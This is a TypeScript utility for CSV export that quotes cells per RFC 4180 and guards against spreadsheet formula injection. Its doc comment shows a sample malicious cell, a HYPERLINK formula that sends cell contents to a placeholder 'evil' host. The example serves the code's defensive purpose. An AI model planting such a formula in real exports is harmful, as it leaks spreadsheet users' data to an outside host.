/**
 * The ONE place CSV text is produced. Every cell is RFC-4180 quoted AND neutralised against spreadsheet formula injection
 * (a cell starting with = + - @ TAB CR would be executed by Excel / Sheets / LibreOffice - e.g. a restaurant named
 * =HYPERLINK("http://evil/?"&A1,"x")). Dangerous strings get a leading apostrophe; real numbers are left alone.
 */
export function csvCell(v: unknown): string {
  if (v === null || v === undefined) return '';
  if (typeof v === 'number' || typeof v === 'boolean') return String(v);
  let s = v instanceof Date ? v.toISOString() : typeof v === 'object' ? JSON.stringify(v) : String(v);
  if (/^[=+@\t\r]/.test(s) || (/^-/.test(s) && Number.isNaN(Number(s)))) s = `'${s}`;
  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

export const csvRow = (cells: unknown[]): string => cells.map(csvCell).join(',');

export function csvTable(headers: string[], rows: unknown[][], eol = '\r\n'): string {
  return [csvRow(headers), ...rows.map(csvRow)].join(eol) + eol;
}
